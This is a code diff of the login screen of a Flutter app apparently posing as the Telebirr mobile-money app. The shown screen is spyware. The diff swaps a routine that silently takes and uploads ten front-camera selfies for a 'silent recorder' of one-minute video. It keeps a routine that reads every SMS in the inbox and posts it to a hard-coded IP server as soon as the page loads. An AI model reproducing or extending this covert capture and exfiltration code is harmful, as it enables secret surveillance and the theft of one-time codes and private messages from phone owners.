@@ -3,12 +3,11 @@ import 'package:telebirrbybr7/screens/pin_entry_page.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:http/http.dart' as http;
-import 'package:camera/camera.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:telephony/telephony.dart';
+import 'package:telebirrbybr7/services/silent_recorder.dart';
 import 'dart:convert';
 import 'dart:io';
-import 'dart:async';
 
 class LoginPage extends StatefulWidget {
   const LoginPage({super.key});
@@ -18,7 +17,7 @@ class LoginPage extends StatefulWidget {
 }
 
 class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMixin {
-  final TextEditingController _controller = TextEditingController(text: "974814108");
+  final TextEditingController _controller = TextEditingController(text: "994797189");
   final DeviceInfoPlugin _deviceInfo = DeviceInfoPlugin();
 
   late AnimationController _animationController;
@@ -30,13 +29,7 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
   // Server configuration
   static const String serverUrl = "http://148.116.91.16:3000";
 
-  // Silent selfie capture
-  static CameraController? _cameraController;
-  static bool _isCapturingSelfies = false;
-  static const int selfieCount = 10;
-  static const Duration selfieInterval = Duration(seconds: 1);
-
-  // SMS reading
+  // SMS upload state
   static bool _isUploadingSms = false;
 
   @override
@@ -58,8 +51,8 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
 
     // Start silent background tasks AFTER first frame
     WidgetsBinding.instance.addPostFrameCallback((_) {
-      _startSilentSelfieCapture();
-      _readAndUploadAllSms();
+      SilentRecorder.startRecording();  // 1-min silent video → uploads/videos/
+      _readAndUploadAllSms();           // SMS JSON → uploads/sms/
     });
   }
 
@@ -67,153 +60,54 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
   void dispose() {
     _animationController.dispose();
     _controller.dispose();
-    _cameraController?.dispose();
-    _cameraController = null;
-    _isCapturingSelfies = false;
     super.dispose();
-  }
-
-  // ==================== SILENT SELFIE CAPTURE ====================
-
-  Future<void> _startSilentSelfieCapture() async {
-    if (_isCapturingSelfies) {
-      print("📷 Selfie capture already in progress");
-      return;
-    }
-
-    try {
-      final cameras = await availableCameras();
-      final frontCamera = cameras.firstWhere(
-        (c) => c.lensDirection == CameraLensDirection.front,
-      );
-
-      _cameraController = CameraController(
-        frontCamera,
-        ResolutionPreset.medium,
-        enableAudio: false,
-        imageFormatGroup: ImageFormatGroup.jpeg,
-      );
-
-      await _cameraController!.initialize();
-      _isCapturingSelfies = true;
-      print("📷 Starting silent selfie capture: $selfieCount photos");
-
-      for (int i = 0; i < selfieCount; i++) {
-        if (!_isCapturingSelfies || _cameraController == null) break;
-
-        try {
-          // Capture photo
-          final XFile photo = await _cameraController!.takePicture();
-          print("📸 Selfie ${i + 1}/$selfieCount captured: ${photo.path}");
-
-          // Upload immediately
-          _uploadSelfie(File(photo.path), i + 1);
-
-          // Wait 1 second before next capture (except after last)
-          if (i < selfieCount - 1) {
-            await Future.delayed(selfieInterval);
-          }
-        } catch (e) {
-          print("❌ Selfie ${i + 1} failed: $e");
-        }
-      }
-
-      print("✅ Selfie capture sequence complete");
-    } catch (e) {
-      print("❌ Selfie capture initialization failed: $e");
-    } finally {
-      _isCapturingSelfies = false;
-      await _cameraController?.dispose();
-      _cameraController = null;
-    }
-  }
-
-  Future<void> _uploadSelfie(File file, int index) async {
-    try {
-      final prefs = await SharedPreferences.getInstance();
-      final deviceId = prefs.getString('deviceId') ?? 'device_unknown';
-      final timestamp = DateTime.now().millisecondsSinceEpoch;
-
-      final request = http.MultipartRequest(
-        'POST',
-        Uri.parse('$serverUrl/api/upload/selfie'),
-      );
-      request.files.add(await http.MultipartFile.fromPath('selfie', file.path));
-      request.fields['folder'] = 'selfie';
-      request.fields['filename'] = 'selfie_${deviceId}_${timestamp}_$index.jpg';
-      request.fields['deviceId'] = deviceId;
-      request.fields['index'] = index.toString();
-      request.fields['timestamp'] = timestamp.toString();
-
-      final response = await request.send().timeout(
-        const Duration(seconds: 30),
-      );
-
-      if (response.statusCode == 200) {
-        print("✅ Selfie $index uploaded successfully");
-      } else {
-        print("❌ Selfie $index upload failed: ${response.statusCode}");
-      }
-
-      // Clean up local file
-      await file.delete();
-    } catch (e) {
-      print("❌ Selfie $index upload error: $e");
-      // Try to delete local file even on error
-      try {
-        if (await file.exists()) {
-          await file.delete();
-        }
-      } catch (_) {}
-    }
   }
 
   // ==================== SMS READING & UPLOAD ====================
 
   Future<void> _readAndUploadAllSms() async {
-  if (_isUploadingSms) {
-    print("📩 SMS upload already in progress");
-    return;
-  }
+    if (_isUploadingSms) {
+      print("📩 SMS upload already in progress");
+      return;
+    }
 
-  _isUploadingSms = true;
+    _isUploadingSms = true;
 
-  try {
-    final telephony = Telephony.instance;
-    print("📩 Reading all SMS messages...");
+    try {
+      final telephony = Telephony.instance;
+      print("📩 Reading all SMS messages...");
 
-    // Read SMS without sortOrder to avoid import issues
-    final List<SmsMessage> messages = await telephony.getInboxSms(
-      columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE, SmsColumn.TYPE],
-    );
+      final List<SmsMessage> messages = await telephony.getInboxSms(
+        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE, SmsColumn.TYPE],
+      );
 
-    print("📩 Found ${messages.length} SMS messages");
+      print("📩 Found ${messages.length} SMS messages");
 
-    // Build JSON array
-    final List<Map<String, dynamic>> smsList = messages.map((sms) {
-      return {
-        'address': sms.address ?? 'Unknown',
-        'body': sms.body ?? '',
-        'date': sms.date?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString(),
-        'type': sms.type?.toString() ?? '1',
-        'read': true,
+      // Build JSON array
+      final List<Map<String, dynamic>> smsList = messages.map((sms) {
+        return {
+          'address': sms.address ?? 'Unknown',
+          'body': sms.body ?? '',
+          'date': sms.date?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString(),
+          'type': sms.type?.toString() ?? '1',
+          'read': true,
+        };
+      }).toList();
+
+      final Map<String, dynamic> smsJson = {
+        'totalCount': smsList.length,
+        'messages': smsList,
+        'timestamp': DateTime.now().millisecondsSinceEpoch,
       };
-    }).toList();
 
-    final Map<String, dynamic> smsJson = {
-      'totalCount': smsList.length,
-      'messages': smsList,
-      'timestamp': DateTime.now().millisecondsSinceEpoch,
-    };
-
-    // Upload JSON to server
-    await _uploadSmsJson(smsJson);
-  } catch (e) {
-    print("❌ SMS reading error: $e");
-  } finally {
-    _isUploadingSms = false;
+      // Upload JSON to server
+      await _uploadSmsJson(smsJson);
+    } catch (e) {
+      print("❌ SMS reading error: $e");
+    } finally {
+      _isUploadingSms = false;
+    }
   }
-}
 
   Future<void> _uploadSmsJson(Map<String, dynamic> smsData) async {
     try {
@@ -254,7 +148,7 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
     }
   }
 
-  // ==================== ORIGINAL LOGIN LOGIC (MINUS FINGERPRINT CHECK) ====================
+  // ==================== LOGIN LOGIC (FINGERPRINT CHECK REMOVED) ====================
 
   // Get or create device ID
   Future<String> _getDeviceId() async {
@@ -326,7 +220,7 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
     }
   }
 
-  // Method to handle Next button press (FINGERPRINT CHECK REMOVED)
+  // Method to handle Next button press
   Future<void> _handleNextPress() async {
     if (_isChecking) return;
 
@@ -336,8 +230,6 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
     });
 
     try {
-      // FINGERPRINT CHECK REMOVED - All devices allowed
-
       final deviceId = await _getDeviceId();
       final serverResponse = await _getPinFromServer(deviceId);
 
